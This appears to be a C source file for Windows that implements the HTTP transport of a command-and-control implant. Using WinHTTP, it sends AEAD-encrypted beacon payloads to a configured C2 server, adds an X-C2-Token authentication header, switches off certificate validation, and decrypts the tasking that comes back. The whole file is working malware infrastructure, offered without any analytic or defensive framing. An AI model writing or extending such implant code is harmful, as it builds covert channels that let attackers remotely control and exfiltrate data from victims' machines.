#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "transport/http.h"
#include "crypto/crypto.h"
#include "config.h"

#define HTTP_BUF_SIZE  (512 * 1024)
#define PATH_BUF_SIZE  512

/**
 * @brief Perform an HTTP(S) POST via WinHTTP.
 * @param host         Server hostname or IP.
 * @param port         TCP port.
 * @param path         Request path.
 * @param body         Request body bytes.
 * @param body_len     Request body length.
 * @param out_body     Receives heap-allocated response body. Caller must free().
 * @param out_body_len Receives response body length.
 * @return 0 on success, -1 on any failure or non-200 status.
 */
static int http_post_winhttp(const char *host, int port, const char *path,
                              const uint8_t *body, int body_len,
                              uint8_t **out_body, int *out_body_len) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    char      headers[512]              = {0};
    uint8_t  *resp                      = NULL;
    int       ret                       = -1;
    DWORD     bytes_available = 0, bytes_read = 0;
    int       total                     = 0;
    DWORD     flags                     = 0;
    wchar_t   wide_host[PATH_BUF_SIZE]  = {0};
    wchar_t   wide_path[PATH_BUF_SIZE]  = {0};
    wchar_t   wide_agent[PATH_BUF_SIZE] = {0};
    wchar_t   wide_headers[512]         = {0};

    *out_body     = NULL;
    *out_body_len = 0;

#if C2_USE_HTTPS
    flags = WINHTTP_FLAG_SECURE;
#endif

    const char *auth_token = C2_AUTH_TOKEN;
    if (auth_token[0] != '\0') {
        snprintf(headers, sizeof(headers),
                 "Host: %s:%d\r\nUser-Agent: %s\r\nX-C2-Token: %s\r\n"
                 "Content-Type: application/octet-stream\r\nConnection: close\r\n",
                 host, port, C2_USER_AGENT, auth_token);
    } else {
        snprintf(headers, sizeof(headers),
                 "Host: %s:%d\r\nUser-Agent: %s\r\n"
                 "Content-Type: application/octet-stream\r\nConnection: close\r\n",
                 host, port, C2_USER_AGENT);
    }

    if (!MultiByteToWideChar(CP_UTF8, 0, host,          -1, wide_host,    PATH_BUF_SIZE)) goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, path,          -1, wide_path,    PATH_BUF_SIZE)) goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, C2_USER_AGENT, -1, wide_agent,   PATH_BUF_SIZE)) goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, headers,       -1, wide_headers, 512))           goto cleanup;

    hSession = WinHttpOpen(wide_agent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, wide_host, (INTERNET_PORT)port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", wide_path, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) goto cleanup;

#if C2_USE_HTTPS
    {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }
#endif

    if (!WinHttpAddRequestHeaders(hRequest, wide_headers, -1L, WINHTTP_ADDREQ_FLAG_ADD))
        goto cleanup;

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, body_len, body_len, 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    /* Check HTTP status before reading body — a non-200 means the body
     * is an error string, not an encrypted beacon payload. */
    {
        DWORD status = 0, status_len = sizeof(status);
        if (!WinHttpQueryHeaders(hRequest,
                                 WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                 WINHTTP_HEADER_NAME_BY_INDEX,
                                 &status, &status_len, WINHTTP_NO_HEADER_INDEX))
            goto cleanup;
        if (status != 200) {
#ifdef DEBUG
            fprintf(stderr, "[http] non-200 status %lu for %s\n", status, path);
#endif
            goto cleanup;
        }
    }

    resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
    if (!resp) goto cleanup;

    while (WinHttpQueryDataAvailable(hRequest, &bytes_available) &&
           bytes_available > 0 && total < HTTP_BUF_SIZE - 1) {
        if (bytes_available > (DWORD)(HTTP_BUF_SIZE - 1 - total))
            bytes_available = (DWORD)(HTTP_BUF_SIZE - 1 - total);
        /* Break rather than goto on read failure so partial reads are returned. */
        if (!WinHttpReadData(hRequest, resp + total, bytes_available, &bytes_read)) break;
        if (bytes_read == 0) break;
        total += (int)bytes_read;
    }

    if (total <= 0) goto cleanup;

    *out_body     = resp;
    *out_body_len = total;
    resp = NULL;
    ret  = 0;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    free(resp);
    return ret;
}

int http_post_raw(const char *host, int port, const char *path,
                  const uint8_t *body, int body_len,
                  uint8_t **out_body, int *out_body_len) {
    return http_post_winhttp(host, port, path, body, body_len,
                             out_body, out_body_len);
}

int http_post_encrypted(const char *host, int port, const char *path,
                        const uint8_t *plain_data, int plain_len,
                        uint8_t **out_plain, int *out_plain_len) {
    uint8_t        *enc_body     = NULL;
    uint8_t        *resp         = NULL;
    size_t          enc_len      = 0;
    int             raw_resp_len = 0;
    int             ret          = -1;
    uint8_t         empty[1]     = {0};
    const uint8_t  *payload      = plain_data ? plain_data : empty;
    int             payload_len  = plain_data ? plain_len  : 0;

    *out_plain     = NULL;
    *out_plain_len = 0;

    enc_body = aead_encrypt(payload, (size_t)payload_len, &enc_len);
    if (!enc_body) goto cleanup;

    if (http_post_winhttp(host, port, path, enc_body, (int)enc_len,
                          &resp, &raw_resp_len) != 0)
        goto cleanup;

    if (!resp || raw_resp_len < 12 + 16) goto cleanup;

    size_t   decrypted_len = 0;
    uint8_t *plain = aead_decrypt(resp, (size_t)raw_resp_len, &decrypted_len);
    if (!plain) goto cleanup;

    *out_plain     = plain;
    *out_plain_len = (int)decrypted_len;
    ret = 0;

cleanup:
    free(enc_body);
    free(resp);
    return ret;
}
